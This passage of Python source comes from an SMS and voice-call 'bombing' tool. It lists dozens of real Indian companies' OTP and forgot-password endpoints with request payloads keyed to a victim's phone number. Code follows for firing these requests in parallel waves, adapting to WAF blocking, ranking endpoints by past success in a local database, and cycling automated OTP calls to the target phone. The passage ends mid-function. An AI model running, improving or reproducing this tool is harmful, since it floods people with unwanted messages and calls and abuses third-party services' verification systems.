            "csrfToken": "hydra-bypass-token",
            "redirectUri": "https://paytm.com/v1/api/authresponse",
            "clientId": "paytm-web-secure",
            "scope": "paytm",
            "responseType": "code"
        }
    },
    # TBomb-sourced (secondary Paytm SMS endpoint)
    {
        "name": "FiMoney",
        "category": "finance",
        "url": "https://epifi.com/api/v1/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://fi.money",
            "Referer": "https://fi.money/login"
        },
        "payload": {"phone": "<PHONE>"}
    },

    # ── EDUCATION ───────────────────────────────────────────
    {
        "name": "Vedantu",
        "category": "education",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/"
        },
        "payload": {
            "email": None,
            "phoneCode": "+91",
            "phoneNumber": "<PHONE>",
            "ver": "11.345"
        }
    },

    # ── BOOKING / SERVICES ──────────────────────────────────
    {
        "name": "UrbanCompany",
        "category": "booking",
        "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.urbancompany.com",
            "x-device-os": "web",
            "x-version-name": "web_v4.137.2"
        },
        "payload": {
            "country_id": "IND",
            "phone": {
                "isd_code": "+91",
                "phone_wo_isd": "<PHONE>"
            },
            "device_type": "customer"
        }
    },

    # ═══════════════════════════════════════════════════════
    #  TBOMB apidata.json "91" SECTION — ALL VERIFIED ACTIVE
    # ═══════════════════════════════════════════════════════
    {
        "name": "ConfirmTkt",
        "category": "travel",
        "url": "https://securedapi.confirmtkt.com/api/platform/register",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {"Origin": "https://confirmtkt.com"},
        "params": {"newOtp": "true", "mobileNumber": "<PHONE>"}
    },
    {
        "name": "JustDial",
        "category": "services",
        "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.justdial.com",
            "Referer": "https://www.justdial.com/"
        },
        "params": {"mobile": "<PHONE>"}
    },
    {
        "name": "AllenSolly",
        "category": "e-commerce",
        "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {"Origin": "https://www.allensolly.com"},
        "payload": {"mobileoremail": "<PHONE>", "name": "TestUser"}
    },
    {
        "name": "Porter",
        "category": "transport",
        "url": "https://porter.in/restservice/send_app_link_sms",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://porter.in",
            "Referer": "https://porter.in/"
        },
        "payload": {"phone": "<PHONE>", "referrer_string": "", "brand": "porter"}
    },
    {
        "name": "Cityflo",
        "category": "transport",
        "url": "https://cityflo.com/website-app-download-link-sms/",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://cityflo.com",
            "Referer": "https://cityflo.com/"
        },
        "payload": {"mobile_number": "<PHONE>"}
    },
    {
        "name": "Cashify",
        "category": "e-commerce",
        "url": "https://www.cashify.in/api/cu01/v1/app-link",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.cashify.in",
            "Referer": "https://www.cashify.in/"
        },
        "params": {"mn": "<PHONE>"}
    },
    {
        "name": "Unacademy-AppLink",
        "category": "education",
        "url": "https://unacademy.com/api/v1/user/get_app_link/",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://unacademy.com",
            "Referer": "https://unacademy.com/"
        },
        "payload": {"phone": "<PHONE>"}
    },
    {
        "name": "Frotels",
        "category": "travel",
        "url": "https://www.frotels.com/appsendsms.php",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {"Origin": "https://www.frotels.com"},
        "payload": {"mobno": "<PHONE>"}
    },

    # ═══════════════════════════════════════════════════════
    #  ADDITIONAL VERIFIED INDIAN PLATFORMS
    # ═══════════════════════════════════════════════════════
    {
        "name": "Practo",
        "category": "healthcare",
        "url": "https://api.practo.com/v3/auth/otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.practo.com",
            "Referer": "https://www.practo.com/",
            "x-practo-client": "practo-web-v2"
        },
        "payload": {"phone": "+91<PHONE>", "type": "login"}
    },
    {
        "name": "Meesho",
        "category": "e-commerce",
        "url": "https://api.meesho.com/auth/v2/generate_otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://meesho.com",
            "meesho-iso-country-code": "IN",
            "meesho-client": "web",
            "meesho-request-context": "user-auth"
        },
        "payload": {"phoneNumber": "<PHONE>"}
    },
    {
        "name": "FreeCharge",
        "category": "finance",
        "url": "https://www.freecharge.in/api/v1/user/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.freecharge.in",
            "Referer": "https://www.freecharge.in/",
            "X-Requested-With": "XMLHttpRequest"
        },
        "payload": {"mobileNo": "<PHONE>"}
    },
    {
        "name": "PhonePe",
        "category": "finance",
        "url": "https://api.phonepe.com/apis/pg/v3/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.phonepe.com",
            "Referer": "https://www.phonepe.com/app/login"
        },
        "payload": {"mobile": "<PHONE>", "countryCode": "+91"}
    },
    {
        "name": "BigBasket",
        "category": "grocery",
        "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.bigbasket.com",
            "x-channel": "BB-PWA",
            "x-entry-context": "bb",
            "x-entry-context-id": "10165",
            "Referer": "https://www.bigbasket.com/auth/login/"
        },
        "payload": {"identifier": "<PHONE>"}
    },
    {
        "name": "Mamaearth",
        "category": "e-commerce",
        "url": "https://mamaearth.in/api/v1/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://mamaearth.in",
            "Referer": "https://mamaearth.in/login"
        },
        "payload": {"phone": "<PHONE>"}
    },
    {
        "name": "Josh-App",
        "category": "entertainment",
        "url": "https://api.myjosh.com/v2/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.myjosh.com",
            "Referer": "https://www.myjosh.com/"
        },
        "payload": {"phone": "<PHONE>", "countryCode": "+91"}
    },
    {
        "name": "Lenskart",
        "category": "e-commerce",
        "url": "https://api.lenskart.com/v2/customers/sendOtp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.lenskart.com",
            "x-api-client": "mobilesite",
            "x-client-id": "LK-WEB-SITE"
        },
        "payload": {"telephone": "<PHONE>"}
    },
    {
        "name": "Purplle",
        "category": "e-commerce",
        "url": "https://www.purplle.com/api/account/authorization/send_otp?phone=<PHONE>&action=register",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.purplle.com",
            "Referer": "https://www.purplle.com/login"
        }
    },
    {
        "name": "Nykaa",
        "category": "e-commerce",
        "url": "https://api.nykaa.com/customer/api/v1/sendOtp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.nykaa.com",
            "Referer": "https://www.nykaa.com/login",
            "X-Nykaa-Client": "msite"
        },
        "payload": {"phone": "<PHONE>", "countryCode": "+91"}
    },
    {
        "name": "IndiaMart",
        "category": "e-commerce",
        "url": "https://seller.indiamart.com/messagebird/login/",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://seller.indiamart.com",
            "Referer": "https://seller.indiamart.com/",
            "X-Requested-With": "XMLHttpRequest"
        },
        "payload": {"mobile": "<PHONE>", "cc": "91"}
    },

    # ── PHASE 4.4 NEW RECON TARGETS ─────────────────────────
    {
        "name": "JioNet",
        "category": "telecom",
        "url": "https://jionet.jio.in/JioCompanion/user/sendOTP",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://jionet.jio.in",
            "Referer": "https://jionet.jio.in/"
        },
        "payload": {"mobile": "<PHONE>"}
    },
    {
        "name": "Allen",
        "category": "edtech",
        "url": "https://api.allen.in/auth/v1/send-otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://allen.in",
            "Referer": "https://allen.in/login"
        },
        "payload": {"mobile": "<PHONE>", "countryCode": "+91"}
    },
    {
        "name": "NoBroker",
        "category": "real-estate",
        "url": "https://www.nobroker.in/api/v1/property/signup/otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.nobroker.in",
            "Referer": "https://www.nobroker.in/"
        },
        "payload": {"phoneNumber": "<PHONE>", "countryCode": "91"}
    },
    {
        "name": "Cuemath",
        "category": "edtech",
        "url": "https://api.cuemath.com/api/v1/parents/request-otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.cuemath.com",
            "Referer": "https://www.cuemath.com/signup"
        },
        "payload": {"phoneNumber": "<PHONE>", "countryCode": "+91"}
    },
    {
        "name": "Hungama",
        "category": "entertainment",
        "url": "https://api.hungama.com/v1/auth/send_otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.hungama.com",
            "Referer": "https://www.hungama.com/"
        },
        "payload": {"phone": "<PHONE>", "country_code": "91"}
    },
    {
        "name": "MarutiSuzuki",
        "category": "automotive",
        "url": "https://pre-prod.marutisuzuki.com/api/v1/generate-otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.marutisuzuki.com",
            "Referer": "https://www.marutisuzuki.com/"
        },
        "payload": {"mobileNumber": "<PHONE>"}
    },
    {
        "name": "JeepIndia",
        "category": "automotive",
        "url": "https://www.jeep-india.com/api/auth/sendotp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.jeep-india.com",
            "Referer": "https://www.jeep-india.com/"
        },
        "payload": {"mobile": "<PHONE>", "country_code": "91"}
    },
    {
        "name": "Swiggy",
        "category": "food",
        "url": "https://prod-reno.swiggy.com/api/otp_service/v1/sms/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
            "X-Device-Info": "android"
        },
        "payload": {"mobile": "<PHONE>", "type": "LOGIN"}
    },
    {
        "name": "Zepto",
        "category": "grocery",
        "url": "https://node-api.zeptonow.com/api/v1/auth/send-otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.zeptonow.com",
            "Referer": "https://www.zeptonow.com/"
        },
        "payload": {"phoneNumber": "<PHONE>", "countryCode": "+91"}
    },
]

# ─────────────────────────────────────────────────────────────
#  PHASE 4.1 — RECOVERY TARGETS (Vector B: Forgot-Password SMS)
#  Triggers "forgot password" SMS flows — distinct from OTP login
#  Both vectors fire simultaneously in separate thread pools.
# ─────────────────────────────────────────────────────────────
RECOVERY_TARGETS = [
    {
        "name": "Paytm-Recovery",
        "category": "fintech",
        "url": "https://login.paytm.com/v2/login/sms",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://paytm.com", "Referer": "https://paytm.com/forgot-password"},
        "payload": {"mobile": "<PHONE>", "client_id": "C11", "request_source": "forgot_password"}
    },
    {
        "name": "Flipkart-Recovery",
        "category": "e-commerce",
        "url": "https://api.flipkart.net/api/3/user/reset-password",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.flipkart.com", "Referer": "https://www.flipkart.com/account/forgot-password"},
        "payload": {"loginId": "<PHONE>", "loginType": "MOBILE"}
    },
    {
        "name": "Swiggy-Recovery",
        "category": "food",
        "url": "https://prod-reno.swiggy.com/api/otp_service/v1/sms/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.swiggy.com"},
        "payload": {"mobile": "<PHONE>", "type": "FORGOT_PASSWORD"}
    },
    {
        "name": "Zomato-Recovery",
        "category": "food",
        "url": "https://api.zomato.com/api/v2.1/user/forgot_password",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.zomato.com", "Referer": "https://www.zomato.com/forgot-password"},
        "payload": {"mobile": "<PHONE>", "country_id": "1"}
    },
    {
        "name": "Ola-Recovery",
        "category": "mobility",
        "url": "https://api.olacabs.com/v1/accounts/password/reset",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.olacabs.com"},
        "payload": {"mobile_number": "<PHONE>", "country_code": "91"}
    },
    {
        "name": "PhonePe-Recovery",
        "category": "fintech",
        "url": "https://api.phonepe.com/apis/hermes/v1/user/password/reset/sendOTP",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.phonepe.com"},
        "payload": {"mobileNumber": "<PHONE>"}
    },
    {
        "name": "MakeMyTrip-Recovery",
        "category": "travel",
        "url": "https://www.makemytrip.com/api/login/forgotpassword",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.makemytrip.com", "Referer": "https://www.makemytrip.com/login"},
        "payload": {"mobile": "<PHONE>", "countryCode": "+91"}
    },
    {
        "name": "PolicyBazaar-Recovery",
        "category": "insurance",
        "url": "https://www.policybazaar.com/pblife/secure/api/v1/user/send-otp-forgot-password",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.policybazaar.com"},
        "payload": {"mobileNumber": "<PHONE>"}
    },
    {
        "name": "Naukri-Recovery",
        "category": "jobs",
        "url": "https://www.naukri.com/user-service/user/v2/forgot-password/send-otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.naukri.com", "Referer": "https://www.naukri.com/forgot-password"},
        "payload": {"mobile": "<PHONE>"}
    },
    {
        "name": "Myntra-Recovery",
        "category": "fashion",
        "url": "https://api.myntra.com/v1/profile/password/forgot",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.myntra.com"},
        "payload": {"mobile": "<PHONE>", "countryCode": "91"}
    },
]

# ─────────────────────────────────────────────────────────────
#  PHASE 4.3 — WAF ADAPTIVE THROTTLE THRESHOLDS
# ─────────────────────────────────────────────────────────────
WAF_BLOCK_THRESHOLD = 0.50   # >50% BLOCKED in a wave → throttle
WAF_THROTTLE_FACTOR = 1.5    # multiply stagger by this amount
WAF_THROTTLE_MAX    = 3.0    # cap at 3.0s

# ─────────────────────────────────────────────────────────────
#  PHASE 4.5 — PLATFORM PROFILES  (fingerprint map)
#  Stores OTP expiry, lockout duration, lockout scope per target
#  Location: hydra_data/platform_profiles.json
# ─────────────────────────────────────────────────────────────
_PROFILES_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hydra_data", "platform_profiles.json")
_platform_profiles: dict = {}

def _load_platform_profiles() -> dict:
    """Load platform_profiles.json. Returns empty dict on error."""
    global _platform_profiles
    try:
        with open(_PROFILES_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
            _platform_profiles = {k: v for k, v in data.items() if not k.startswith("_")}
    except FileNotFoundError:
        pass
    except Exception:
        pass
    return _platform_profiles

def get_platform_profile(name: str) -> dict | None:
    """Return profile for a target by name, or None if not profiled."""
    if not _platform_profiles:
        _load_platform_profiles()
    # Try exact match first, then partial
    if name in _platform_profiles:
        return _platform_profiles[name]
    low = name.lower()
    for k, v in _platform_profiles.items():
        if k.lower() in low or low in k.lower():
            return v
    return None

# ─────────────────────────────────────────────
#  SESSION LOG  (written to file after each run)
# ─────────────────────────────────────────────
session_log = {
    "session_id": datetime.now().strftime("%Y%m%d_%H%M%S"),
    "target_phone": "",
    "start_time": "",
    "end_time": "",
    "waves_fired": 0,
    "results": []
}

# ─────────────────────────────────────────────
#  PHASE 3.1 — INTELLIGENCE DB  (SQLite local)
#  Stores every request result for smart ranking
#  Location: hydra_data/sessions.db
# ─────────────────────────────────────────────
_DB_DIR  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hydra_data")
_DB_PATH = os.path.join(_DB_DIR, "sessions.db")

def _db_init():
    """Create hydra_data/ and sessions.db schema if not already present."""
    os.makedirs(_DB_DIR, exist_ok=True)
    con = sqlite3.connect(_DB_PATH)
    cur = con.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            ts           TEXT    NOT NULL,
            target_name  TEXT    NOT NULL,
            category     TEXT    NOT NULL,
            phone        TEXT    NOT NULL,
            verdict      TEXT    NOT NULL,
            http_status  INTEGER,
            resp_time_ms INTEGER,
            body_snippet TEXT,
            session_id   TEXT    NOT NULL
        )
    """)
    cur.execute("CREATE INDEX IF NOT EXISTS idx_target_verdict ON results(target_name, verdict, ts)")
    con.commit()
    con.close()

_DB_LOCK = threading.Lock()

def db_write(record: dict, session_id: str):
    """Write a single fire() result to the intelligence DB. Thread-safe."""
    try:
        with _DB_LOCK:
            con = sqlite3.connect(_DB_PATH)
            con.execute(
                """INSERT INTO results
                   (ts, target_name, category, phone, verdict, http_status, resp_time_ms, body_snippet, session_id)
                   VALUES (?,?,?,?,?,?,?,?,?)""",
                (
                    record.get("time", ""),
                    record.get("target", ""),
                    record.get("category", ""),
                    record.get("phone", ""),
                    record.get("verdict", ""),
                    record.get("status"),
                    record.get("resp_time_ms"),
                    record.get("body", "")[:300],
                    session_id,
                )
            )
            con.commit()
            con.close()
    except Exception:
        pass  # never crash the main thread on DB errors

def db_get_stats(days: int = 7) -> list[dict]:
    """Return per-target OTP_SENT rate over the last N days. Sorted by rate desc."""
    try:
        cutoff = datetime.now().timestamp() - days * 86400
        # SQLite stores ts as HH:MM:SS — we use rowid time approximation instead
        con = sqlite3.connect(_DB_PATH)
        rows = con.execute("""
            SELECT target_name,
                   COUNT(*) AS total,
                   SUM(CASE WHEN verdict='OTP_SENT' THEN 1 ELSE 0 END) AS hits
            FROM results
            WHERE id > (SELECT MAX(id) - 50000 FROM results)
            GROUP BY target_name
        """).fetchall()
        con.close()
        stats = []
        for name, total, hits in rows:
            stats.append({"target": name, "total": total, "hits": hits,
                          "rate": round(hits / total, 3) if total else 0})
        return sorted(stats, key=lambda x: -x["rate"])
    except Exception:
        return []


# ─────────────────────────────────────────────
#  PHASE 3.3 — RESPONSE BODY PARSER
#  Deep keyword analysis → high-accuracy verdict
#  Also extracts soft-block cooldown hints
# ─────────────────────────────────────────────

_KW_OTP_SENT = (
    "otp sent", "sms sent", "sent successfully", "verification code sent",
    "sms dispatched", "message sent", "otp generated", "code sent",
    "\"success\":true", "\"status\":\"success\"", "\"sent\":true",
    "\"result\":\"success\"", "\"message\":\"otp", "\"msg\":\"otp",
    "successfully sent", "\"ok\":true", "otpsent", "otpgenerated",
)
_KW_RATE    = (
    "too many", "too many requests", "rate limit", "ratelimit", "slow down",
    "try after", "try again", "limit exceeded", "quota exceeded",
    "maximum attempt", "max attempt", "flood", "spam",
)
_KW_BLOCKED = (
    "blocked", "blacklist", "invalid number", "number not allowed",
    "number blocked", "not registered", "unauthorized", "forbidden",
    "suspended", "banned",
)
_KW_FAKE_OK = (
    "invalid", "error", "fail", "false", "not found", "does not exist",
    "not exist", "exception", "undefined", "null", "0", "no user",
)
_RE_COOLDOWN = re.compile(r"(\d+)\s*(second|sec|minute|min)", re.IGNORECASE)

def parse_body(body: str, http_status: int) -> tuple[str, int | None]:
    """
    Deep-parse response body.
    Returns (verdict: str, cooldown_seconds: int | None).
    cooldown_seconds is non-None when a soft-block retry hint is detected.
    """
    low = body.lower()
    cooldown = None

    # Extract cooldown hint before everything else
    m = _RE_COOLDOWN.search(low)
    if m:
        val = int(m.group(1))
        unit = m.group(2).lower()
        cooldown = val * 60 if "min" in unit else val

    # HTTP-level overrides first
    if http_status == 429:
        return "RATE_LIMITED", cooldown
    if http_status in (403, 401):
        return "BLOCKED", cooldown
    if http_status not in (200, 201, 202, 204):
        return f"FAIL_{http_status}", cooldown

    # Body-level classification (priority order)
    if any(k in low for k in _KW_BLOCKED):
        return "BLOCKED", cooldown
    if any(k in low for k in _KW_RATE):
        return "RATE_LIMITED", cooldown
    if any(k in low for k in _KW_OTP_SENT):
        return "OTP_SENT", cooldown
    if any(k in low for k in _KW_FAKE_OK):
        return "200_FAKE", cooldown

    # Ambiguous 200 — body has neither confirm nor deny keywords.
    # CHANGED 2026-04-26: Used to lie and tag these as OTP_SENT, inflating success
    # numbers ~3-5x. Now honest: ambiguous = 200_FAKE (probable silent fail).
    # Only count true OTP_SENT when explicit confirm keywords are present.
    return "200_FAKE", cooldown


# ─────────────────────────────────────────────
#  PHASE 3.2 — SMART WAVE COMPOSER
#  Ranks targets by historical OTP_SENT rate.
#  Top performers get cloned (2x attempts).
#  Chronic blockers (0% over 5+ fires) removed.
# ─────────────────────────────────────────────

def compose_smart_wave(targets: list) -> list:
    """
    Returns a reordered + amplified target list for the next wave:
    - Top 5 by success rate → duplicated (2x)
    - Bottom targets with ≥5 fires and 0% success → pruned
    - Remainder → shuffled as normal
    Gracefully degrades to full shuffle if DB has no history.
    """
    stats = db_get_stats()
    if not stats:
        shuffled = targets.copy()
        random.shuffle(shuffled)
        return shuffled

    rate_map = {s["target"]: s for s in stats}

    ranked_w_history  = []
    ranked_no_history = []
    pruned_names      = set()

    for t in targets:
        s = rate_map.get(t["name"])
        if s:
            if s["total"] >= 5 and s["hits"] == 0:
                pruned_names.add(t["name"])   # chronic blocker
            else:
                ranked_w_history.append((t, s["rate"]))
        else:
            ranked_no_history.append(t)

    # Sort by rate descending
    ranked_w_history.sort(key=lambda x: -x[1])
    sorted_targets = [t for t, _ in ranked_w_history]

    # Top 5 get 2x attempts — append duplicate
    top5 = sorted_targets[:5]
    composed = sorted_targets + top5 + ranked_no_history

    pruned_count = len(pruned_names)
    if pruned_count:
        composed = [t for t in composed if t["name"] not in pruned_names]
        print(f"{DIM}[INTEL] Pruned {pruned_count} chronic-block targets from this wave.{RESET}")

    random.shuffle(composed)  # shuffle to avoid identical wave ordering
    return composed


# ─────────────────────────────────────────────
#  PHONE FORMAT HELPER
# ─────────────────────────────────────────────
def resolve_phone(phone: str, fmt: str) -> str:
    """Convert raw 10-digit phone to required format."""
    if fmt == "with_plus91":
        return f"+91{phone}"
    elif fmt == "91-":
        return f"91-{phone}"
    elif fmt == "91prefix":
        return f"91{phone}"
    else:   # raw — 10 digits only
        return phone



# ─────────────────────────────────────────────────────────────
#  CALL TRACKER — tracks voice call session state + auto-retry
# ─────────────────────────────────────────────────────────────
CALL_SUCCESS_KEYWORDS = (
    "callmade", "success", "true", "placed", "initiated",
    "otp", "call", "sent", "verified", "ringing", ":y,", '"y"',
    # plain single-char responses (RealEstateIndia returns literal Y)
    "'y'", "^y$",
)

def _call_success_match(body_l: str) -> bool:
    """Check call success keywords including plain 'Y' response."""
    stripped = body_l.strip()
    if stripped in ("y", "yes", "1"):
        return True
    return any(kw in body_l for kw in CALL_SUCCESS_KEYWORDS)

class CallTracker:
    """
    Tracks a multi-endpoint sequential call bombing session.

    Behavior:
      - Fires endpoints one at a time (parallel calls = confusing for target)
      - After CALL_PLACED → waits ring_timeout_secs for ring + answer window
      - After CALL_BLOCKED/FAILED → immediately tries next endpoint (no wait)
      - After full cycle → repeats up to max_cycles
      - Real-time status pushed via log_fn

    Call status detection (from API response only — we can't detect actual answer):
      CALL_PLACED          200 + success keyword → call actually dialed
      CALL_200_UNCONFIRMED 200 but no success keyword (call may or may not have fired)
      CALL_BLOCKED         403/401 — WAF/rate-limit
      CALL_RATELIMITED     429
      CALL_FAILED_NNN      Other 4xx/5xx
      RING_TIMEOUT         We waited ring_timeout after CALL_PLACED with no new info
    """

    def __init__(self, phone: str, ring_timeout: float = 35.0):
        self.phone         = phone
        self.ring_timeout  = ring_timeout
        self.call_log      = []   # list of attempt records
        self.placed        = 0    # calls confirmed placed
        self.unconfirmed   = 0    # 200 but no success keyword
        self.blocked       = 0    # 403/401
        self.failed        = 0    # 4xx/5xx other
        self.ring_timeouts = 0    # times waited full ring_timeout
        self.cycles        = 0
        self._lock         = threading.Lock()

    def classify(self, http_status: int, body: str) -> str:
        """Classify a call fire() result into a call-specific verdict."""
        status = http_status if isinstance(http_status, int) else 0
        body_l = body.lower()
        if status in (403, 401):
            return "CALL_BLOCKED"
        if status == 429:
            return "CALL_RATELIMITED"
        if status in (200, 201):
            # Explicit rate-limit responses (e.g. MagicBricks "attempt exceeded")
            if any(kw in body_l for kw in ("attempt exceeded", "limit exceeded", "too many attempt", "max attempt")):
                return "CALL_RATELIMITED"
            if _call_success_match(body_l):
                return "CALL_PLACED"
            return "CALL_200_UNCONFIRMED"
        if status == 0:
            return "CALL_TIMEOUT"
        return f"CALL_FAIL_{status}"

    def record(self, endpoint_name: str, verdict: str, http_status, body: str = ""):
        with self._lock:
            self.call_log.append({
                "ts":       datetime.now().strftime("%H:%M:%S"),
                "endpoint": endpoint_name,
                "verdict":  verdict,
                "status":   http_status,
                "cycle":    self.cycles,
            })
            if verdict == "CALL_PLACED":
                self.placed += 1
            elif verdict == "CALL_200_UNCONFIRMED":
                self.unconfirmed += 1
            elif verdict in ("CALL_BLOCKED", "CALL_RATELIMITED"):
                self.blocked += 1
            elif verdict.startswith("CALL_FAIL") or verdict == "CALL_TIMEOUT":
                self.failed += 1

    def wait_ring(self, log_fn=None) -> str:
        """
        Wait ring_timeout seconds with 5-second countdown ticks.
        Returns: 'completed' | 'stopped'
        """
        start    = time.time()
        deadline = start + self.ring_timeout
        next_log = start + 5

        while time.time() < deadline:
            if STOP.is_set():
                return "stopped"
            now       = time.time()
            remaining = int(deadline - now)
            if now >= next_log and log_fn:
                log_fn({
                    "time":     datetime.now().strftime("%H:%M:%S"),
                    "target":   "RING-WAIT",
                    "category": "call-otp",
                    "verdict":  f"RINGING... [{remaining}s until timeout → next endpoint]",
                    "status":   "WAIT",
                    "body":     ""
                })
                next_log = now + 5
            time.sleep(0.5)

        with self._lock:
            self.ring_timeouts += 1
        if log_fn:
            log_fn({
                "time":     datetime.now().strftime("%H:%M:%S"),
                "target":   "RING-WAIT",
                "category": "call-otp",
                "verdict":  f"RING_TIMEOUT — no answer detected, cycling to next endpoint",
                "status":   "TIMEOUT",
                "body":     ""
            })
        return "completed"

    def summary(self) -> dict:
        with self._lock:
            return {
                "phone":         self.phone,
                "cycles":        self.cycles,
                "placed":        self.placed,
                "unconfirmed":   self.unconfirmed,
                "blocked":       self.blocked,
                "failed":        self.failed,
                "ring_timeouts": self.ring_timeouts,
                "total_calls":   self.placed + self.unconfirmed,
                "recent_log":    self.call_log[-30:]
            }


# ─────────────────────────────────────────────────────────────
#  CALL SESSION ENGINE
#  Sequential call firing with ring tracking + auto-cycle
# ─────────────────────────────────────────────────────────────
def run_call_session(
    phone:        str,
    call_targets: list,
    max_cycles:   int   = 5,
    ring_timeout: float = 35.0,
    debug:        bool  = False,
    log_fn              = None,
) -> tuple:
    """
    Orchestrate a full sequential call bombing session.

    Firing order:
      cycle 1: endpoint_1 → [wait ring_timeout] → endpoint_2 → ... → endpoint_N
      cycle 2: shuffle order → repeat
      ...up to max_cycles

    Returns: (all_results: list, summary: dict)
    """
    tracker     = CallTracker(phone, ring_timeout)
    all_results = []

    if not call_targets:
        if log_fn:
            log_fn({"time": datetime.now().strftime("%H:%M:%S"), "target": "CallSession",
                    "category": "call-otp", "verdict": "NO_CALL_ENDPOINTS — add call targets",
                    "status": "ERR", "body": ""})
        return all_results, tracker.summary()

    for cycle_num in range(max_cycles):
        if STOP.is_set():
            break

        tracker.cycles = cycle_num + 1
        cycle_targets  = call_targets.copy()
        random.shuffle(cycle_targets)   # randomise per cycle

        if log_fn:
            log_fn({
                "time":     datetime.now().strftime("%H:%M:%S"),
                "target":   "CallSession",
                "category": "call-otp",
                "verdict":  f"━━ CALL CYCLE {cycle_num + 1}/{max_cycles}  [{len(cycle_targets)} endpoints] ━━",
                "status":   "CYCLE",
                "body":     ""
            })

        for target in cycle_targets:
            if STOP.is_set():
                break

            bucket = []
            fire(target, phone, bucket, debug, None)   # raw fire, no stream yet

            if bucket:
                r = bucket[0]
                all_results.append(r)

                http_code    = r.get("status", 0)
                body         = r.get("body", "")
                call_verdict = tracker.classify(
                    http_code if isinstance(http_code, int) else 0,
                    body
                )
                tracker.record(target["name"], call_verdict, http_code, body)

                # Stream enriched result
                if log_fn:
                    log_fn({
                        **r,
                        "verdict":      call_verdict,
                        "call_verdict": call_verdict,
                    })

                if call_verdict == "CALL_PLACED":
                    # Confirmed call — wait for ring
                    outcome = tracker.wait_ring(log_fn)
                    if outcome == "stopped":
                        break
                elif call_verdict == "CALL_200_UNCONFIRMED":
                    # 200 but no voice confirmation — likely SMS fallback, skip ring wait
                    time.sleep(2.0)
                else:
                    # Blocked/failed — short delay before next endpoint
                    time.sleep(1.5)

        # Cycle summary
        s = tracker.summary()
        if log_fn:
            log_fn({
                "time":     datetime.now().strftime("%H:%M:%S"),
                "target":   "CallSession",
                "category": "call-otp",
                "verdict":  (
                    f"CYCLE {cycle_num + 1} DONE  "
                    f"Placed:{s['placed']}  Unconf:{s['unconfirmed']}  "
                    f"Blocked:{s['blocked']}  Timeouts:{s['ring_timeouts']}"
                ),
                "status":   "DONE",
                "body":     json.dumps(s)
            })

    # Final session summary
    final = tracker.summary()
    if log_fn:
        log_fn({
            "time":     datetime.now().strftime("%H:%M:%S"),
            "target":   "CallSession",
            "category": "call-otp",
            "verdict":  (
                f"SESSION COMPLETE  "
                f"TotalCalls:{final['total_calls']}  "
                f"Placed:{final['placed']}  Cycles:{final['cycles']}"
            ),
            "status":   "END",
            "body":     json.dumps(final)
        })

    return all_results, final


# ─────────────────────────────────────────────
#  CORE FIRE FUNCTION
# ─────────────────────────────────────────────
def fire_php_bridge(phone: str, target: dict) -> dict:
    """
    Phase 9.1 — Fire via PHP cURL stack.
